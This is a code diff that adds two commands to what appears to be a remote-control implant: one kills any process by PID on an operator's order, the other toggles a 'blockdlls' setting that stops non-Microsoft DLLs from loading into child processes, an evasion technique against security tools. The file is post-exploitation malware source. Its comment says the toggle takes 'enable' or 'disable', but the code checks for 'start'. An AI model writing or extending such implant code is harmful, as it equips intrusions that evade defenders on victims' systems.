@@ -102,3 +102,91 @@ cleanup:
     PackageDestroy(locals);
 }
 #endif	//INCLUDE_CMD_PS
+
+
+#ifdef INCLUDE_CMD_KILL
+/**
+ * @brief Terminate a process by PID.
+ *
+ * @param[in] taskUuid Task's UUID
+ * @param[inout] arguments PARSER struct containing the PID.
+ * @return VOID
+ */
+VOID ProcessKill(PCHAR taskUuid, PPARSER arguments)
+{
+    UINT32 nbArg = ParserGetInt32(arguments);
+    _dbg("\t Got %d arguments", nbArg);
+
+    if (nbArg == 0)
+        return;
+
+    UINT32 pid = ParserGetInt32(arguments);
+    _dbg("Killing PID %d", pid);
+
+    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    if (!hProcess)
+    {
+        DWORD error = GetLastError();
+        _err("OpenProcess failed for PID %d: %d", pid, error);
+        PackageError(taskUuid, error);
+        return;
+    }
+
+    if (!TerminateProcess(hProcess, 0))
+    {
+        DWORD error = GetLastError();
+        _err("TerminateProcess failed for PID %d: %d", pid, error);
+        CloseHandle(hProcess);
+        PackageError(taskUuid, error);
+        return;
+    }
+
+    CloseHandle(hProcess);
+    PackageComplete(taskUuid, NULL);
+}
+#endif	//INCLUDE_CMD_KILL
+
+
+#ifdef INCLUDE_CMD_BLOCKDLLS
+/**
+ * @brief Enable or disable the blockdlls setting.
+ *        When enabled, newly spawned child processes will have
+ *        PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+ *        applied, preventing unsigned DLLs from loading.
+ *
+ * @param[in] taskUuid Task's UUID
+ * @param[inout] arguments PARSER struct containing "enable" or "disable".
+ * @return VOID
+ */
+VOID ProcessBlockDlls(PCHAR taskUuid, PPARSER arguments)
+{
+    UINT32 nbArg = ParserGetInt32(arguments);
+    _dbg("\t Got %d arguments", nbArg);
+
+    if (nbArg == 0)
+    {
+        // No argument — report current status
+        PPackage data = PackageInit(0, FALSE);
+        PackageAddFormatPrintf(data, FALSE, "blockdlls: %s\n",
+            xenonConfig->blockDlls ? "enabled" : "disabled");
+        PackageComplete(taskUuid, data);
+        PackageDestroy(data);
+        return;
+    }
+
+    SIZE_T size  = 0;
+    PCHAR  state = ParserStringCopy(arguments, &size);
+
+    if (_stricmp(state, "start") == 0)
+        xenonConfig->blockDlls = TRUE;
+    else
+        xenonConfig->blockDlls = FALSE;
+
+    PPackage data = PackageInit(0, FALSE);
+    PackageAddFormatPrintf(data, FALSE, "blockdlls: %s\n",
+        xenonConfig->blockDlls ? "enabled" : "disabled");
+    PackageComplete(taskUuid, data);
+    PackageDestroy(data);
+    LocalFree(state);
+}
+#endif	//INCLUDE_CMD_BLOCKDLLS
